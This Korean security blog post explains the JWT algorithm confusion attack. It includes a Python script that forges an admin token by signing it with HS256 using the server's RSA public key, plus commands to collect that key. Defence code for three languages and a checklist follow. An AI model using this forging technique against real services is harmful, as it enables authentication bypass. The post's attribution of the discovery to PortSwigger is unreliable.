---
title: "JWT 알고리즘 혼동 공격: RS256을 HS256으로 우회하기"
description: "JWT 알고리즘 혼동(Algorithm Confusion) 공격의 원리를 설명하고, 서버가 alg 파라미터를 신뢰할 때 공개키로 위조 토큰을 만드는 방법과 완전한 방어 구현을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-02"
archiveOrder: 1
type: "knowledge"
category: "Security"
tags: ["JWT", "알고리즘혼동", "RS256", "HS256", "토큰위조", "웹보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-jwt-security/)에서 JWT 기본 구조와 `alg:none` 공격을 살펴봤다. 이번에는 더 교묘한 변종인 **알고리즘 혼동(Algorithm Confusion) 공격**을 다룬다. 이 취약점은 포트스위거(PortSwigger)가 발견했으며, 실제 운영 환경의 여러 서비스에서 발견된 심각한 인증 우회 취약점이다.

## 알고리즘 혼동이란

JWT는 헤더의 `alg` 필드에 서명 알고리즘을 선언한다. 서버가 이 값을 **그대로 신뢰**하면 공격자는 알고리즘을 바꿔치기할 수 있다.

가장 흔한 시나리오는 `RS256`(비대칭 RSA) → `HS256`(대칭 HMAC) 전환이다.

- **RS256**: 서버는 개인키로 서명하고, 공개키로 검증한다. 공개키는 누구나 볼 수 있다.
- **HS256**: 서버가 같은 키로 서명하고 검증한다(대칭).

공격자는 서버의 RSA **공개키**를 가져다가 `alg`를 `HS256`으로 바꾸고, 공개키로 HMAC 서명한 토큰을 만든다. 서버가 토큰의 `alg`를 믿으면 동일한 공개키로 HMAC을 재계산해 서명이 일치한다.

![JWT 알고리즘 혼동 공격 흐름](/assets/posts/websec-jwt-algorithm-confusion-attack.svg)

## 공격 단계별 분석

### 1단계: 공개키 수집

공개키는 여러 경로로 얻을 수 있다.

```bash
# JWK 엔드포인트에서 공개키 획득 (흔히 공개됨)
curl https://api.example.com/.well-known/jwks.json

# 또는 두 토큰에서 RSA 공개키 역산 (jwt_tool 등 활용)
python3 jwt_tool.py -t token1 -t token2 -pk
```

### 2단계: 위조 토큰 생성

```python
import jwt
import base64

# RS256 공개키를 PEM 형식으로 보유
public_key_pem = open("server_public.pem").read()

# 공격자가 원하는 페이로드
malicious_payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

# HS256으로 서명 — 키는 서버의 공개키
forged_token = jwt.encode(
    malicious_payload,
    public_key_pem,          # 공개키를 HMAC 비밀키로 사용
    algorithm="HS256"         # RS256이 아닌 HS256
)
print(forged_token)
```

### 3단계: 서버 검증 통과 (취약한 경우)

취약한 서버는 토큰 헤더의 `alg: HS256`을 읽고 HMAC으로 검증한다. 이때 서버가 보유한 공개키로 HMAC을 계산하면 공격자의 서명과 정확히 일치한다. 결과적으로 **권한 우회**가 성공한다.

## 방어 구현

핵심 원칙은 하나다: **서버는 절대 토큰 헤더의 `alg` 값을 신뢰하지 않는다.**

![JWT 알고리즘 혼동 방어 코드](/assets/posts/websec-jwt-algorithm-confusion-defense.svg)

### Python (PyJWT)

```python
import jwt
from cryptography.hazmat.primitives import serialization

PUBLIC_KEY = open("public.pem").read()
# RS256만 허용 — 다른 알고리즘 자동 거부
ALLOWED_ALGORITHMS = ["RS256"]

def verify_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            PUBLIC_KEY,
            algorithms=ALLOWED_ALGORITHMS,   # 명시 필수
            options={
                "require": ["exp", "iss", "sub"],
                "verify_exp": True,
            }
        )
        return payload
    except jwt.InvalidAlgorithmError:
        raise ValueError("허용되지 않은 알고리즘")
    except jwt.ExpiredSignatureError:
        raise ValueError("만료된 토큰")
```

### Node.js (jsonwebtoken)

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

const PUBLIC_KEY = fs.readFileSync('public.pem');

function verifyToken(token) {
  // algorithms 배열 명시 — 없으면 기본값이 모든 알고리즘 허용
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],   // RS256만 허용
    issuer: 'https://auth.example.com',
    audience: 'api',
  });
}
```

### Java (nimbus-jose-jwt)

```java
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.crypto.RSASSAVerifier;
import com.nimbusds.jwt.SignedJWT;

SignedJWT jwt = SignedJWT.parse(token);

// 알고리즘 검증: 헤더와 기대값 비교
if (!JWSAlgorithm.RS256.equals(jwt.getHeader().getAlgorithm())) {
    throw new SecurityException("허용되지 않은 알고리즘: "
        + jwt.getHeader().getAlgorithm());
}

RSASSAVerifier verifier = new RSASSAVerifier(rsaPublicKey);
if (!jwt.verify(verifier)) {
    throw new SecurityException("서명 검증 실패");
}
```

## alg:none 공격과의 차이

| 공격 유형 | 수법 | 방어 |
|---|---|---|
| `alg:none` | 서명 자체를 없앰 | `algorithms` 목록에서 `none` 제외 |
| Algorithm Confusion | 알고리즘 종류 변경 | `algorithms` 목록을 단일 알고리즘으로 고정 |
| 약한 비밀키 | 무작위 대입 | 256비트 이상 무작위 키 사용 |

## 체크리스트

- [ ] `algorithms=["RS256"]`처럼 허용 알고리즘을 **명시적으로 하나만** 지정
- [ ] `alg:none` 및 `HS256`을 비대칭 키 서버에서 완전히 차단
- [ ] 공개키를 절대 HMAC 비밀키로 사용하지 않음
- [ ] `exp`, `iss`, `aud` 클레임 필수 검증
- [ ] JWT 라이브러리를 최신 버전으로 유지

---

**지난 글:** [JWT 보안: 올바른 사용법과 취약점](/posts/websec-jwt-security/)

**다음 글:** [토큰 보안 모범 사례](/posts/websec-token-security/)

<br>
읽어주셔서 감사합니다. 😊
